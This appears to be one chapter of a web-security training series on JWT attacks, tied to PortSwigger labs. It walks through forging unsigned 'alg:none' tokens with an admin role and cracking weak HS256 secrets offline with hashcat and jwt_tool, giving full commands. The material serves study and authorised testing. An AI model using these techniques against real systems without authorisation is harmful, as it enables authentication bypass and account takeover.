# 02 — alg:none Attack and Weak Secret Brute-Forcing

## Prerequisite

Read file 1 first. Both attacks in this file exploit the same root cause
described there: the server trusts the `alg` field inside the token instead
of enforcing its own expected algorithm.

---

## Part A — The `alg:none` Attack

### Mechanism

The JWT specification defines `none` as a legal value for `alg`, meaning "this
token is unsecured — do not verify a signature." This exists for legitimate
use cases (e.g. a JWT passed between two trusted internal systems that
apply their own transport-layer security). The vulnerability occurs when a
**public-facing** verification endpoint still honors `alg:none` from an
externally supplied token — meaning an attacker can simply declare their own
token unsigned and the server will accept it as valid, with **no signature
required at all**.

### Step-by-Step Exploitation

**Step 1 — Decode the original token** to see the header and payload
structure (see file 1, section 5, for the `base64 -d` breakdown).

**Step 2 — Modify the header** to declare `none` as the algorithm:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Note: some vulnerable implementations only check `alg` case-insensitively as
a workaround for one specific bypass, so if `none` is rejected, also try
variants: `None`, `NONE`, `nOnE`. This works because some parsers normalize
case for comparison against a blocklist but not consistently across the whole
validation path.

**Step 3 — Modify the payload** with whatever claims you want to forge, e.g.:

```json
{
  "sub": "1",
  "role": "admin",
  "exp": 9999999999
}
```

**Step 4 — Re-encode both parts** as Base64URL (no padding), and construct the
final token with an **empty signature segment**:

```
<base64url(header)>.<base64url(payload)>.
```

The trailing dot with nothing after it represents an empty signature — this
is required; simply omitting the third segment entirely will cause most
parsers to reject the token as malformed, whereas an empty-but-present segment
matches the spec's definition of an unsecured JWT.

**Step 5 — Replace your session token** with this forged value (cookie,
`Authorization: Bearer` header, or wherever the app stores it) and send the
request.

### Command Breakdown (manual construction with jwt_tool)

```bash
python3 jwt_tool.py <original_token> -X a
```

- `python3 jwt_tool.py` — invokes the tool.
- `<original_token>` — the JWT you captured from the application, used as the
  template for header/payload structure.
- `-X a` — jwt_tool's dedicated "exploit" flag for the `alg:none` attack
  specifically (`a` = the none-algorithm attack). It automatically generates
  all the case-variant `none` permutations (`none`, `None`, `NONE`, etc.) and
  outputs multiple candidate forged tokens for you to test.

## Part B — HS256 Weak Secret Brute-Forcing

### Mechanism

HS256 is symmetric: the exact same secret string signs and verifies the
token. If a developer used a weak, short, dictionary-guessable, or
default/example secret (a shockingly common mistake — copy-pasted from a
tutorial, or a short string like `secret` or the app name), an attacker can
brute-force that secret **entirely offline**, with no rate limiting, no
lockouts, and no interaction with the live server at all. Once the secret is
recovered, the attacker can sign arbitrary forged tokens that pass
verification perfectly — this is a far more dangerous outcome than
`alg:none`, because the resulting tokens are cryptographically valid, not
just accepted due to a parsing quirk.

### Method 1 — hashcat

**Step 1 — Prepare the token** as a single line in a file:

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt_target.txt
```

**Step 2 — Run hashcat** using the JWT-specific hash mode:

```bash
hashcat -a 0 -m 16500 jwt_target.txt rockyou.txt
```

- `-a 0` — attack mode `0` = straight/dictionary attack (try each wordlist
  entry as-is, no rule mutation).
- `-m 16500` — hash mode `16500` is hashcat's dedicated **JWT (HS256)** mode.
  It knows how to parse `header.payload.signature`, recompute HMAC-SHA256 over
  `header.payload` for each candidate secret, and compare against the
  signature segment.
- `jwt_target.txt` — the file containing the full token to attack.
- `rockyou.txt` — the wordlist of candidate secrets. Swap for custom
  wordlists (app name, company name variants, common API secret patterns)
  for better hit rate against real targets.

**Step 3 — Show the cracked result**:

```bash
hashcat -m 16500 jwt_target.txt rockyou.txt --show
```

- `--show` — hashcat caches cracked results in its "potfile"; this flag
  reprints them without re-running the attack, formatted as `hash:secret`.

**Optional — rule-based attack** for smarter guessing beyond raw dictionary
words:

```bash
hashcat -a 0 -m 16500 jwt_target.txt rockyou.txt -r rules/best64.rule
```

- `-r rules/best64.rule` — applies hashcat's built-in `best64` mutation
  ruleset (case toggling, appending digits, leetspeak substitutions, etc.) to
  every wordlist entry, dramatically increasing coverage without needing a
  bigger wordlist.

### Method 2 — jwt_tool

```bash
python3 jwt_tool.py <target_token> -C -d rockyou.txt
```

- `-C` — jwt_tool's flag to run a **secret-cracking** attack against an
  HS256-signed token.
- `-d rockyou.txt` — specifies the dictionary file to use for the crack
  attempt (jwt_tool iterates every line as a candidate secret and checks the
  HMAC locally, same underlying logic as hashcat mode 16500, just built into
  the tool directly).

jwt_tool is generally slower than hashcat for large wordlists (it's
Python, not GPU-accelerated C), but it's convenient because once it finds the
secret, you can immediately pivot to forging tokens with `-T` (tamper mode,
covered in file 6) using that recovered secret — no context switching to
another tool.

### After Recovering the Secret

Once you have the secret, forge any token you want using jwt_tool's tamper
mode (full flag breakdown in file 6):

```bash
python3 jwt_tool.py <target_token> -T -S hs256 -p "your_recovered_secret"
```

- `-T` — tamper mode: interactively edit claims before re-signing.
- `-S hs256` — sign the resulting token using algorithm `hs256`.
- `-p "your_recovered_secret"` — the password/secret to sign with (this is
  the cracked value from hashcat or jwt_tool's `-C` mode).

## Real-World Notes

- `alg:none` is now a well-known enough vulnerability class that most
  maintained JWT libraries reject it by default — but it still surfaces
  regularly in custom-rolled JWT handling, older codebases, and IoT/embedded
  API implementations that vendored an old library version.
- Weak secrets are, in practice, more common than `alg:none` in real
  bug bounty findings, because HS256 is the default "just works" choice in
  many tutorials, and developers frequently hardcode a short placeholder
  secret that never gets rotated before shipping to production.
- A recovered HS256 secret is often reused across multiple services in the
  same organization (shared secret for microservice-to-microservice auth) —
  cracking one weak JWT secret can sometimes compromise an entire internal
  API ecosystem, which is why this finding class tends to be rated
  Critical rather than High in bounty triage.

## PortSwigger Lab Mapping

In official difficulty-progression order:

1. **"JWT authentication bypass via unverified signature"** — maps directly to
   Part A of this file (no signature check at all; closely related to, though
   not identical in root cause to, `alg:none` — this lab's flaw is that the
   server never checks the signature at all regardless of algorithm claimed).
2. **"JWT authentication bypass via flawed signature verification"** — the
   lab that most directly matches the classic `alg:none` bypass described in
   Part A.
3. **"JWT authentication bypass via weak signing key"** — maps directly to
   Part B of this file (HS256 weak secret brute-forcing).

**Honest gap disclosure**: PortSwigger's weak-signing-key lab ships with a
small bundled wordlist sized for the lab specifically. It does not walk you
through hashcat mode 16500 or rule-based mutation attacks — that tooling
depth (both hashcat commands above) is supplementary material from this
series, not something PortSwigger's lab instructions themselves cover. Full
jwt_tool and hashcat usage should be practiced against the lab's token using
the commands in this file and in file 6, not just PortSwigger's suggested
approach.
